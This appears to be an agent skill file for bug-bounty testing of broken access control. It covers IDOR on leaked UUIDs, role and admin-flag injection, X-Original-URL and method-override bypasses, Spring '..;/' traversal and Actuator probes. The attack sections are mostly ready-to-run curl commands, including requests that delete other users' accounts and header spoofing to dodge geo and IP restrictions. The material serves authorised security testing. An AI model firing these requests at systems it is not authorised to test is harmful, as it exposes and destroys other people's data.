---
name: access-control-testing
description: "Broken access control and authorization testing — IDOR/BOLA, vertical/horizontal privilege escalation, Burp Autorize, UUID leaks, multi-step bypass, X-Original-URL, method override. Use when testing admin panels, user data endpoints, role-based access, or multi-tenant applications."
---

# Access Control / Broken Authorization

## Crown Jewel Targets

- **Multi-tenant SaaS platforms** — cross-tenant IDOR on org data, billing, user management endpoints (Critical bounties, highest payout density)
- **E-commerce admin APIs** — order management, inventory, pricing endpoints accessible with customer tokens
- **Healthcare/fintech portals** — patient records, financial statements, KYC documents behind weak authorization
- **User-generated content platforms** — private message/file access via sequential or leaked UUIDs
- **B2B dashboards** with role hierarchy — viewer accessing manager/admin functions (vertical escalation)
- **API-first applications** where frontend hides buttons but backend accepts all requests — JS bundle reveals admin routes
- **Subscription/payment platforms** — free tier accessing premium features, modifying billing details of other users

## Attack Surface Signals

- **URL patterns**: `/api/v1/users/{id}`, `/admin/`, `/manage/`, `/internal/`, `/staff/`, `/api/v1/orgs/{id}/members`
- **Response headers**: Autorize green results, different response codes per role (403 vs 200 vs 302)
- **Response body patterns**: `"role":"admin"`, `"isAdmin":false`, `"permissions":[]`, UUID/numeric IDs in JSON
- **Tech stack signals**: Spring Boot (`/actuator/*`), Django DRF (`?format=api`), Rails (`.json` extension), Express route params
- **JS bundle patterns**: `isAdmin`, `role.*admin`, `adminPanel`, `/admin/`, `canAccess`, `hasPermission`, `authorize`
- **Error messages**: `403 Forbidden`, `401 Unauthorized`, `insufficient permissions`, `access denied`

> Broken access control has been the #1 OWASP Top 10 vulnerability since 2021. Highest bounty density across all bug bounty programs. Every endpoint is a potential target.

## Types of Access Control Flaws

### Vertical Privilege Escalation
User-level account performs admin-level actions. Regular user accessing `/admin/`, modifying system configuration, managing other users, or executing privileged operations.

### Horizontal Privilege Escalation (IDOR/BOLA)
User A accesses User B's data or performs actions on User B's behalf. Same privilege level, wrong identity boundary. Most common and most paid vulnerability class.

### Context-Dependent Access Control
Access that depends on multi-step workflows, application state, or timing. Step 2 of a 3-step admin action can be called directly. Resource accessible during a specific state transition but should not be.

---

## Detection Methodology

### Step 1: Role Mapping
```
Identify ALL roles in the application:
- Guest (unauthenticated)
- Registered user (basic)
- Premium user / paid tier
- Moderator
- Admin
- Super admin / owner
- Service account / API-only role
- Support staff

For each role, document:
- How to obtain the role (registration, invitation, escalation)
- What token/cookie/header identifies the role
- What endpoints are accessible
```

### Step 2: Endpoint Mapping Per Role
```bash
# Crawl as each role, capture all endpoints
# Use Playwright + Burp proxy to map authenticated surfaces

# Burp: Site map → filter by role → export endpoints
# Compare endpoint lists across roles

# Manual enumeration of admin paths from JS bundles
grep -rnE '(admin|manage|settings|config|dashboard|internal|staff|moderate)' target_js/
grep -rnE '"/(admin|manage|internal|staff|debug|system)/[^"]*"' target_js/
```

### Step 3: Cross-Test Matrix
```
For EVERY endpoint accessible to Role Y (higher privilege):
  1. Capture the request in Burp
  2. Replace auth token/cookie with Role X (lower privilege) token
  3. Send request → check if action succeeds
  4. Repeat with unauthenticated request (no token)

Priority order:
  admin endpoints   → test with user token
  admin endpoints   → test with no token
  user A endpoints  → test with user B token
  paid endpoints    → test with free-tier token
  POST/PUT/DELETE   → test with GET-only role token
```

### Step 4: Burp Autorize Extension Workflow
```
1. Login as LOW-privilege user (User B / regular user)
2. Copy session cookie from Browser → Autorize config
3. Login as HIGH-privilege user (Admin / User A) in browser proxied through Burp
4. Browse the application as the high-privilege user
5. Autorize automatically replays every request with the low-privilege cookie
6. Results:
   - GREEN (Bypassed!) = access control BROKEN → finding
   - RED (Enforced) = access control working
   - ORANGE (Is enforced??) = manual investigation needed
7. Also enable "Unauthenticated" testing → replays with no cookie at all
```

### Step 5: Check for Bypasses in Access Control Logic
```
Look for:
- Role parameter in request body: role=user → role=admin
- Admin flag in cookie: admin=false → admin=true
- Referer-based checks: removing Referer bypasses restriction
- Client-side enforcement only: UI hides button but API accepts request
- Predictable URL structure: /users/me/settings → /users/ADMIN_ID/settings
```

---

## Attack Vectors

### A. Unprotected Admin Functionality

```bash
# Admin pages with no server-side auth check
# UI hides the link but the endpoint is wide open
curl -sk "https://TARGET/admin" "https://TARGET/admin/dashboard" "https://TARGET/admin/users"
curl -sk "https://TARGET/administrator" "https://TARGET/management" "https://TARGET/console"
curl -sk "https://TARGET/_admin" "https://TARGET/staff" "https://TARGET/backoffice"

# Discover admin paths from robots.txt
curl -sk "https://TARGET/robots.txt" | grep -i "disallow.*admin"

# Admin paths leaked in JS bundles
grep -rnE '"/admin[^"]*"' target_js/
grep -rnE 'isAdmin|is_admin|role.*admin|adminPanel|adminRoute' target_js/

# Hidden admin panels on non-standard ports
# Cross-ref recon: nmap, httpx port scan results
```

### B. Parameter-Based Access Control

```bash
# Role parameter in request body or URL
curl -sk -X POST "https://TARGET/api/update-profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin"}'

# Admin flag in cookies
# Original: Cookie: session=abc; admin=false
curl -sk -H "Cookie: session=abc; admin=true" "https://TARGET/admin/panel"
curl -sk -H "Cookie: session=abc; access=admin" "https://TARGET/admin/panel"

# Hidden form fields — isAdmin, userType, accessLevel
curl -sk -X POST "https://TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"pass","isAdmin":true,"userType":"administrator","accessLevel":10}'

# Numeric privilege levels
curl -sk -X PUT "https://TARGET/api/users/me" \
  -d '{"privilege_level":999}' -H "Content-Type: application/json"
```

### C. Platform Misconfiguration — URL Rewrite Bypass

```bash
# X-Original-URL header (Spring, IIS, some nginx configs)
# Backend checks /admin → 403. But X-Original-URL bypasses the check.
curl -sk "https://TARGET/" -H "X-Original-URL: /admin/users"
curl -sk "https://TARGET/allowed-path" -H "X-Original-URL: /admin/delete-user"

# X-Rewrite-URL header
curl -sk "https://TARGET/" -H "X-Rewrite-URL: /admin/panel"

# Path normalization differences between proxy and backend
curl -sk "https://TARGET/admin/users"          # 403
curl -sk "https://TARGET/Admin/Users"          # 200? (case-insensitive backend)
curl -sk "https://TARGET/admin/./users"        # 200? (dot segment)
curl -sk "https://TARGET//admin//users"        # 200? (double slash)
curl -sk "https://TARGET/admin%2fusers"        # 200? (URL-encoded slash)
curl -sk "https://TARGET/admin/users;"         # 200? (semicolon)
curl -sk "https://TARGET/admin/users..;/"      # 200? (Spring path traversal)
curl -sk "https://TARGET/admin/users%23"       # 200? (URL-encoded #)
```

### D. HTTP Method-Based Bypass

```bash
# Some frameworks only restrict specific HTTP methods
# POST /admin/delete blocked, but:
curl -sk -X GET "https://TARGET/admin/delete?user=victim"       # GET allowed?
curl -sk -X PUT "https://TARGET/admin/delete" -d 'user=victim'  # PUT allowed?
curl -sk -X PATCH "https://TARGET/admin/delete" -d 'user=victim'

# HEAD returns same status as GET but may bypass body-based checks
curl -sk -X HEAD "https://TARGET/admin/users" -I

# Method override headers (when proxy restricts method but backend supports override)
curl -sk -X POST "https://TARGET/admin/users" \
  -H "X-HTTP-Method-Override: DELETE"
curl -sk -X POST "https://TARGET/admin/users" \
  -H "X-Method-Override: PUT"
curl -sk -X GET "https://TARGET/admin/users?_method=DELETE"

# POSTX and nonstandard methods — some WAFs allow unknown methods
curl -sk -X POSTX "https://TARGET/admin/users"
```

### E. Multi-Step Process Bypass

```bash
# 3-step admin action: Step1 (confirm) → Step2 (verify) → Step3 (execute)
# Skip steps 1 and 2, go directly to step 3

# Example: admin user deletion
# Step 1: POST /admin/users/delete/confirm     → generates CSRF token
# Step 2: POST /admin/users/delete/verify      → verifies admin password
# Step 3: POST /admin/users/delete/execute     → actually deletes user

# Attack: skip to step 3 with a valid session
curl -sk -X POST "https://TARGET/admin/users/delete/execute" \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -d '{"user_id":"victim_id"}'

# Does step 3 check that steps 1+2 completed?
# Test: is there a state token linking the steps?
```

### F. Referer-Based Access Control

```bash
# Some apps check Referer header instead of session for authorization
# Normal: Referer: https://target.com/admin/dashboard → 200
# Attack: set Referer manually

curl -sk -H "Referer: https://TARGET/admin/dashboard" "https://TARGET/admin/users"
curl -sk -H "Referer: https://TARGET/admin" "https://TARGET/admin/delete-user?id=1"

# Remove Referer entirely — does it still work?
curl -sk "https://TARGET/admin/users"  # No Referer header
```

### G. IDOR on UUIDs

```bash
# "We use UUIDs so IDOR is impossible" — FALSE

# Where UUIDs leak:
# 1. API responses: GET /api/v1/teams → lists all members with UUIDs
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/teams" | jq '.[].members[].id'

# 2. Emails and notifications: password reset links, invitation URLs
# 3. JS bundles / __NEXT_DATA__ / window.__STATE__
grep -rnE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' target_js/

# 4. URL parameters in referrer headers
# 5. WebSocket messages broadcasting user IDs
# 6. Public profiles: /users/uuid-here visible to anyone
# 7. Search/filter responses returning full objects

# Once UUID obtained:
curl -sk -H "Authorization: Bearer USER_A_TOKEN" "https://TARGET/api/v1/users/USER_B_UUID/profile"
curl -sk -H "Authorization: Bearer USER_A_TOKEN" "https://TARGET/api/v1/users/USER_B_UUID/settings"
curl -sk -X DELETE -H "Authorization: Bearer USER_A_TOKEN" "https://TARGET/api/v1/users/USER_B_UUID"
```

### H. Insecure Direct Object References in File Operations

```bash
# Predictable file naming
curl -sk "https://TARGET/download?file=user_1234_invoice.pdf"
curl -sk "https://TARGET/download?file=user_5678_invoice.pdf"  # Another user's invoice

# Path traversal in file references
curl -sk "https://TARGET/api/files?path=/users/1234/documents/report.pdf"
curl -sk "https://TARGET/api/files?path=/users/5678/documents/report.pdf"

# File ID enumeration
curl -sk "https://TARGET/api/attachments/1001"  # My attachment
curl -sk "https://TARGET/api/attachments/1002"  # Someone else's attachment?

# Signed URL bypass — check if signature is actually validated
curl -sk "https://TARGET/files/doc.pdf?sig=abc123&user=1234"
curl -sk "https://TARGET/files/doc.pdf?sig=abc123&user=5678"  # Same sig, different user
curl -sk "https://TARGET/files/doc.pdf?user=5678"              # Remove sig entirely
```

---

## Horizontal-to-vertical escalation and context-dependent controls

**Horizontal to vertical** is the pattern that turns a mundane IDOR into a Critical. Reading another *ordinary* user's record is horizontal and often rates Medium. But if the records you can reach include an administrator's — and the response body carries something reusable — the same bug becomes privilege escalation. Concretely: iterate the identifier until you land on an admin account, then check the response for a password field, an API key, a password-reset token, or a session identifier. Applications that would never render those in the UI frequently return them in the raw API object.

Always enumerate far enough to hit a privileged account before deciding an IDOR is "just" horizontal.

**Location-based access control** — restrictions enforced by geography or source network (region-locked pricing, admin panels limited to office IPs, compliance-driven blocks). These are typically applied by a proxy or CDN rather than the application, which makes them bypassable in the usual ways: a VPN or proxy exit in the permitted country, or a spoofed forwarding header (`X-Forwarded-For`, `CF-Connecting-IP`, `True-Client-IP`) where the app trusts it. Confirm the control is genuinely a security boundary rather than a licensing nicety before reporting — and remember that a geo-block 403 signals a live app, not a dead one.

**Context-dependent access control** — the application permits an action only at the right point in a sequence (pay before ship, verify before withdraw). These look like access control but are found by replaying a request out of order; overlaps with `business-logic-testing`.

## Framework-Specific Access Control Patterns

### Spring Security (Java)
```java
// Look for missing @PreAuthorize / @Secured annotations on controllers
// Check: are all endpoints covered by SecurityFilterChain?
// Common mistake: new endpoint added without security annotation

// Test: Spring Actuator endpoints (may bypass security config)
// /actuator/env, /actuator/health, /actuator/beans
// Spring path traversal: /admin/..;/api/public → may route to /api/public
```
```bash
curl -sk "https://TARGET/admin/..;/api/users"
curl -sk "https://TARGET/actuator/env"
curl -sk "https://TARGET/actuator/configprops"
```

### Django (Python)
```python
# Look for views missing @login_required or @permission_required
# Check: Django REST Framework — IsAuthenticated vs AllowAny on ViewSets
# Common mistake: custom permission class has logic error
# Test: DRF browsable API may expose endpoints: /api/?format=api
```
```bash
curl -sk "https://TARGET/api/?format=api"
curl -sk "https://TARGET/api/admin/?format=json"
```

### Rails (Ruby)
```ruby
# Look for controllers without before_action :authenticate_user!
# Check: CanCanCan/Pundit authorization — missing authorize! call
# Common mistake: strong_params allows role attribute
# Test: .json extension may bypass HTML-only restrictions
```
```bash
curl -sk "https://TARGET/admin/users.json"
curl -sk -X PATCH "https://TARGET/users/1.json" -d '{"user":{"role":"admin"}}'
```

### Express/Node.js
```javascript
// Look for routes without auth middleware
// Check: middleware ordering — does auth run before route handler?
// Common mistake: app.use(auth) placed AFTER some routes
// Test: route parameter pollution
```
```bash
curl -sk "https://TARGET/api/users/me" -H "Authorization: Bearer TOKEN"
# vs
curl -sk "https://TARGET/api/users/admin" -H "Authorization: Bearer USER_TOKEN"
```

### ASP.NET (.NET)
```csharp
// Look for controllers missing [Authorize] attribute
// Check: authorization policies — are all roles covered?
// Common mistake: [AllowAnonymous] on sensitive endpoint
// Test: IIS short filename disclosure, web.config exposure
```
```bash
curl -sk "https://TARGET/admin~1" # IIS 8.3 short name
curl -sk "https://TARGET/web.config"
```

---

## Testing Checklist — Systematic Burp Autorize Approach

```
PRE-TEST:
[ ] Map all roles in the application (min: guest, user, admin)
[ ] Create accounts for each role
[ ] Document session tokens/cookies for each role
[ ] Configure Burp Autorize with low-privilege session

VERTICAL ESCALATION:
[ ] Browse as admin → check Autorize for green (bypassed) entries
[ ] Test every admin endpoint with user token
[ ] Test every admin endpoint with no token
[ ] Try admin actions via API even if UI hides them
[ ] Check URL rewrite headers (X-Original-URL, X-Rewrite-URL)
[ ] Test HTTP method overrides on restricted endpoints

HORIZONTAL ESCALATION:
[ ] Every endpoint with user ID → replace with another user's ID
[ ] Test bulk/list endpoints for data leakage across users
[ ] Check file download/export endpoints with other user references
[ ] Test WebSocket channels for cross-user data access

CONTEXT-DEPENDENT:
[ ] Multi-step processes → skip intermediate steps
[ ] State-dependent access → manipulate state parameter
[ ] Time-based access → test outside allowed window
```

---

## Impact Requirements & Triage Checklist

Before reporting any access control finding:

1. **Two-account proof for IDOR**: Demonstrate User A accessing User B's specific data with both request and response. Single account guessing = insufficient
2. **Sensitive action or data**: Accessing public profile info with another user's token is not a finding. Must involve private data (PII, financial, health) or privileged actions (delete, modify, admin operations)
3. **Vertical escalation must show admin action**: Not just accessing the admin page, but executing an admin function (create user, change config, export data) as a regular user
4. **Full request/response in Burp Repeater format**: Raw HTTP showing the auth token used, the endpoint accessed, and the unauthorized response received
5. **Not a feature**: Some applications intentionally share data between users in the same organization. Verify that the access is actually unauthorized per the application's design
6. **Reproducible end-to-end**: Steps that a triager can follow from account creation to exploit in under 10 minutes. Include account credentials or clear provisioning steps

## PortSwigger Academy — Advanced Techniques

### X-Original-URL / X-Rewrite-URL Bypass
- Split the restricted path into the header instead of the URL: `GET / HTTP/1.1` with `X-Original-URL: /admin`
- Backend routing frameworks (Spring, some Nginx/IIS configs) process the header path instead of the request line
- **Validation probe**: send `X-Original-URL: /nonexistent` — if you get a 404 (instead of the normal response for `/`), the backend processes the header

### Spring useSuffixPatternMatch
- `GET /admin/deleteUser.anything` matches the mapping for `/admin/deleteUser` (Spring < 5.3)
- Suffix pattern matching allows arbitrary file extensions to match controller methods
- Bypasses URL-based access control rules that match exact path without considering suffix patterns

### HTTP Method Switching
- `POST /admin` returns 403 (blocked) — try `GET /admin?username=carlos` with parameters in query string
- Some access control middleware only restricts specific HTTP methods on a path
- Also try `PATCH`, `PUT`, `OPTIONS`, `TRACE` — each may be handled differently

### Multi-Step Process Skip
- Skip directly to step 3 of a multi-step admin action, bypassing access controls on steps 1-2
- Step 3 may lack its own authorization check, relying on the assumption that steps 1-2 already verified access
- Test: submit the final step's request directly with a low-privilege session — does it execute?

### Redirect Body Data Leak
- 302/301 redirect responses may contain sensitive data in the response body even though the browser follows the redirect
- Always read the full body of redirect responses in Burp — the server may render the restricted page before redirecting
- `curl -sk -D- https://target.com/admin` — check body content even when Location header redirects away

### GUIDs Leaked Elsewhere
- "Unguessable" UUIDs are often leaked in other parts of the application:
  - User reviews and public comments (author UUID in API response)
  - Message/notification endpoints returning all participant IDs
  - API list responses with full object details (even when UI doesn't display them)
  - WebSocket broadcast messages containing user identifiers
- Harvest UUIDs from these sources, then use them for horizontal privilege escalation

## Operator Notes (Battle-Tested)

1. **Provision 2 accounts BEFORE testing** (`researcher-{slug}-user` + `researcher-{slug}-user2`). Single-account IDOR testing is insufficient for triagers — they require User A accessing User B's specific data with both request and response.
2. **Burp Autorize is the fastest path**: Login as low-priv in one browser, copy cookie to Autorize config, browse as admin in proxied browser. Green entries = instant findings. Run this on every engagement.
3. **JS bundles leak admin routes constantly**: `grep -rnE '"/admin[^"]*"' target_js/` finds endpoints the UI hides. Test each with user token AND no token — many skip server-side checks entirely.
4. **UUID "security" is a myth**: UUIDs leak in team lists, public profiles, notification endpoints, `__NEXT_DATA__`, WebSocket broadcasts. Collect UUIDs passively before claiming IDOR is impossible.
5. **Spring `..;/` bypass is still alive in 2026**: `curl -sk "https://TARGET/admin/..;/api/users"` — Spring path traversal through security filters. Test on every Java target.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Found admin endpoint, need to bypass WAF/auth | `waf-bypass` → `references/waf-generic-evasion.md`, `auth-bypass-testing` |
| IDOR on file download/upload | `file-upload-testing`, `lfi-path-traversal` |
| Need to discover hidden parameters for mass assignment | `hidden-param-discovery` |
| GraphQL endpoint with authorization issues | `graphql-testing` |
| IDOR chains into account takeover | `oauth-testing`, `csrf-testing` |
| API testing across all endpoints | `api-security-testing` |
| Business logic flaws in multi-step workflows | `business-logic-testing` |
